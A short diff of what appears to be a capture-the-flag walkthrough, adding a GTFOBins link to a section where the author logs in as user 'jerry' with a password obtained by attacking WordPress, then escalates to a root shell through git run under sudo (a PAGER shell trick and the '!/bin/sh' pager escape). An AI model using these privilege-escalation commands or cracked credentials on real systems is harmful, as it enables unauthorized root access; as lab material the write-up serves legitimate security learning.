@@ -47,7 +47,11 @@ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 su - jerry   # PASS : parturient (Found in Password attack of wordpress)
 sudo -l 
+```
 
+[GIT SUDO ESCALATION](https://gtfobins.github.io/gtfobins/git/#sudo)
+
+```
 PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
 sudo git -p help config
 !/bin/sh
